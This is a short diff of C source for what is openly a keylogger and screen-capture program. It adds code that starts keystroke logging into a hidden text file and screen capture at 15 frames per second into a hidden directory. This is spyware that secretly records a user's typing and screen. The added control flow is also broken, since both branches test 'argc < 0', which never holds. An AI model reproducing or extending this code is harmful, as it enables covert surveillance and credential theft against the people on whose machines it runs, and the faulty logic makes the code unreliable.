@@ -1,11 +1,13 @@
 #include "keylogger.h"
 #include "screen.h"
 
-const char *output_dir = ".output_screen"
+const char *output_dir = ".output_screen";
+const char *output_file = ".output_text.txt";
 
 #ifdef __linux__
 
 #include <stdio.h>
+#include <string.h>
 #include <stdlib.h>
 #include <unistd.h>
 
@@ -94,13 +96,17 @@ int main(int argc, char *argv[]) {
     }
 
     if (argc < 0){
-
-    }
-    else if (argc < 0) {
+        start(path, "1");
+        start(path, "2");
         
+    } else if (argc < 0) {
+        if (strcmp(argv[0], "1") == 0){
+            start_keylogger(output_file);
+        }
+        else {
+            capture_screen_at_fps(15, output_dir);
+        }
     }
-
-
 }
 
 #endif
